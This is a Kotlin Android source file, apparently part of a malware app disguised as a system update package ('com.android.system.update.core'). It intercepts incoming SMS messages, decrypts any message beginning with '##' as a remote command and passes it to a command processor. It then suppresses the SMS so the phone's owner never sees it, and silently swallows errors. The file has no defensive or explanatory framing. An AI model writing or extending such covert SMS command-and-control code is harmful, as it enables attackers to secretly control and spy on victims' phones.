package com.android.system.update.core

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.provider.Settings
import android.util.Base64
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class RemoteCommandReceiver : BroadcastReceiver() {

    private val random = SecureRandom()
    private lateinit var deviceKey: ByteArray

    override fun onReceive(context: Context, intent: Intent) {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "default"
        deviceKey = MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())

        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (message in messages) {
                val body = message.messageBody
                if (body.startsWith("##")) {
                    val encrypted = body.substring(2)
                    try {
                        val decrypted = decrypt(encrypted)
                        CommandProcessor(context).processCommand(decrypted)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                            abortBroadcast()
                        }
                    } catch (e: Exception) {
                    }
                }
            }
        }
    }

    private fun decrypt(encrypted: String): String {
        val data = Base64.decode(encrypted, Base64.NO_WRAP)
        val iv = data.sliceArray(0..11)
        val ciphertext = data.sliceArray(12 until data.size)
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val spec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(deviceKey, "AES"), spec)
        return String(cipher.doFinal(ciphertext))
    }
}